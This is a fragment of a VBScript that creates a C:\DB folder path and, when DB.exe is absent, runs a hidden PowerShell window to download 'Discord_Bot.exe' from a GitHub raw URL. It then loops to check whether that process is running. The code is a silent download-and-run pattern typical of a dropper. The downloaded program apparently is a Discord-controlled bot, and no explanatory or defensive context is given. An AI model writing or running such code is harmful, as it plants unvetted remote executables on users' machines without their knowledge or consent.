...
discordDir = "C:\DB"
botExePath = discordDir & "\DB.exe" ' Path to bot.exe in the C:\DB directory
...
If Not objFSO.FileExists(botExePath) Then
    objShell.Run "powershell -Command ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4kr4m0/discord/refs/heads/main/Discord_Bot.exe' -OutFile '" & botExePath & "'""", 0, True
End If

' Loop to check if bot.exe is running
Do While i <= 11
    ' Define the bot process name
    botProcessName = "DB.exe"
